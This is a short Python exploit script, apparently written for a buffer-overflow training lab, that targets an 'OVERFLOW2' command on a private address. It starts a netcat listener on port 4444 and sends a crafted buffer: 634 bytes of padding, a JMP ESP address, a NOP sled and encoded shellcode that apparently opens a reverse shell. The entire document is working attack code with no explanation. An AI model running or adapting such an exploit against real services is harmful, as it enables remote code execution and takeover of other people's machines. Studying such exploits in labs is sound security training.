#!/usr/bin/python3
import socket
import time
import subprocess

ip = "10.100.2.6"
port = 1337

listener = subprocess.Popen(["nc", "-nlvp", str(4444)])
time.sleep(2)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

prefix = b"OVERFLOW2 "
offset = 634
jmp_esp = b"\xAF\x11\x50\x62"
nops = b"\x90" * 16

buf =  b""
buf += b"\xfc\xbb\x17\x10\x40\x3b\xeb\x0c\x5e\x56\x31\x1e"
buf += b"\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff"
buf += b"\xff\xeb\xf8\xc2\x3b\x13\xf9\xa2\xb2\xf6\xc8\xe2"
buf += b"\xa1\x73\x7a\xd3\xa2\xd1\x77\x98\xe7\xc1\x0c\xec"
buf += b"\x2f\xe6\xa5\x5b\x16\xc9\x36\xf7\x6a\x48\xb5\x0a"
buf += b"\xbf\xaa\x84\xc4\xb2\xab\xc1\x39\x3e\xf9\x9a\x36"
buf += b"\xed\xed\xaf\x03\x2e\x86\xfc\x82\x36\x7b\xb4\xa5"
buf += b"\x17\x2a\xce\xff\xb7\xcd\x03\x74\xfe\xd5\x40\xb1"
buf += b"\x48\x6e\xb2\x4d\x4b\xa6\x8a\xae\xe0\x87\x22\x5d"
buf += b"\xf8\xc0\x85\xbe\x8f\x38\xf6\x43\x88\xff\x84\x9f"
buf += b"\x1d\x1b\x2e\x6b\x85\xc7\xce\xb8\x50\x8c\xdd\x75"
buf += b"\x16\xca\xc1\x88\xfb\x61\xfd\x01\xfa\xa5\x77\x51"
buf += b"\xd9\x61\xd3\x01\x40\x30\xb9\xe4\x7d\x22\x62\x58"
buf += b"\xd8\x29\x8f\x8d\x51\x70\xd8\x62\x58\x8a\x18\xed"
buf += b"\xeb\xf9\x2a\xb2\x47\x95\x06\x3b\x4e\x62\x68\x16"
buf += b"\x36\xfc\x97\x99\x47\xd5\x53\xcd\x17\x4d\x75\x6e"
buf += b"\xfc\x8d\x7a\xbb\x53\xdd\xd4\x14\x14\x8d\x94\xc4"
buf += b"\xfc\xc7\x1a\x3a\x1c\xe8\xf0\x53\xb7\x13\x93\x51"
buf += b"\x2c\x19\x66\x0e\xae\x1d\x79\x92\x27\xfb\x13\x3a"
buf += b"\x6e\x54\x8c\xa3\x2b\x2e\x2d\x2b\xe6\x4b\x6d\xa7"
buf += b"\x05\xac\x20\x40\x63\xbe\xd5\xa0\x3e\x9c\x70\xbe"
buf += b"\x94\x88\x1f\x2d\x73\x48\x69\x4e\x2c\x1f\x3e\xa0"
buf += b"\x25\xf5\xd2\x9b\x9f\xeb\x2e\x7d\xe7\xaf\xf4\xbe"
buf += b"\xe6\x2e\x78\xfa\xcc\x20\x44\x03\x49\x14\x18\x52"
buf += b"\x07\xc2\xde\x0c\xe9\xbc\x88\xe3\xa3\x28\x4c\xc8"
buf += b"\x73\x2e\x51\x05\x02\xce\xe0\xf0\x53\xf1\xcd\x94"
buf += b"\x53\x8a\x33\x05\x9b\x41\xf0\x25\x7e\x43\x0d\xce"
buf += b"\x27\x06\xac\x93\xd7\xfd\xf3\xad\x5b\xf7\x8b\x49"
buf += b"\x43\x72\x89\x16\xc3\x6f\xe3\x07\xa6\x8f\x50\x27"
buf += b"\xe3\x8f\x56\xd7\x0c"

shellcode = buf

buffer = prefix + (b"A" * offset) + jmp_esp + nops + shellcode

s.send(buffer)

s.close()

listener.wait()
